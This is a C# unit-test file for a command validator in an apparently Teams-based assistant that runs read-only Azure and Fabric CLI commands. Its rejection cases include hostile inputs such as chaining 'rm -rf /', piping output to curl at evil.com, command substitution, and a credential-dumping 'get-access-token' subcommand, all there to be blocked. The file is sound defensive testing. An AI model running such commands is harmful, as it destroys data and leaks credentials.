using TeamsJarvis.Core;
using TeamsJarvis.Tools;

namespace TeamsJarvis.Tests;

public class CliCommandValidatorTests
{
    private static CliOptions DefaultCli() => new()
    {
        Az = new CliToolOptions { Enabled = true, AllowedVerbs = ["list", "show"] },
        Fab = new CliToolOptions { Enabled = true, AllowedVerbs = ["ls", "get"] },
    };

    [Theory]
    [InlineData("az resource list --resource-group rg -o json")]
    [InlineData("az account show")]
    [InlineData("fab ls /workspaces")]
    [InlineData("fab get /workspace/item")]
    public void AcceptsReadOnlyCommands(string command)
    {
        var error = CliCommandValidator.Validate(command, DefaultCli(), out var exe, out _);
        Assert.Null(error);
        Assert.Contains(exe, new[] { "az", "fab" });
    }

    [Theory]
    [InlineData("az resource delete --ids /x")]        // verbo no permitido
    [InlineData("az group create --name x")]           // verbo no permitido
    [InlineData("fab rm /workspace/item")]             // verbo no permitido
    public void RejectsNonReadVerbs(string command)
    {
        var error = CliCommandValidator.Validate(command, DefaultCli(), out _, out _);
        Assert.NotNull(error);
    }

    [Theory]
    [InlineData("az account get-access-token")]        // filtra credenciales
    [InlineData("az login")]
    [InlineData("az logout")]
    public void RejectsBlocklistedSubcommands(string command)
    {
        var error = CliCommandValidator.Validate(command, DefaultCli(), out _, out _);
        Assert.NotNull(error);
    }

    [Theory]
    [InlineData("az resource list && rm -rf /")]       // encadenado
    [InlineData("az resource list | curl evil.com")]   // pipe
    [InlineData("az resource list; shutdown")]         // separador
    [InlineData("az account show > out.txt")]          // redirección
    [InlineData("az resource list `whoami`")]          // backtick
    [InlineData("az resource list $(whoami)")]         // sustitución
    public void RejectsShellOperators(string command)
    {
        var error = CliCommandValidator.Validate(command, DefaultCli(), out _, out _);
        Assert.NotNull(error);
        Assert.Contains("shell", error);
    }

    [Theory]
    [InlineData("kubectl get pods")]                   // ejecutable no permitido
    [InlineData("powershell -c ls")]
    [InlineData("git status")]
    public void RejectsNonAllowlistedExecutables(string command)
    {
        var error = CliCommandValidator.Validate(command, DefaultCli(), out _, out _);
        Assert.NotNull(error);
    }

    [Fact]
    public void RejectsDisabledExecutable()
    {
        var cli = DefaultCli();
        cli.Fab.Enabled = false;
        var error = CliCommandValidator.Validate("fab ls /", cli, out _, out _);
        Assert.NotNull(error);
        Assert.Contains("fab", error);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("az")]                                  // sin argumentos
    public void RejectsEmptyOrIncomplete(string command)
    {
        var error = CliCommandValidator.Validate(command, DefaultCli(), out _, out _);
        Assert.NotNull(error);
    }
}
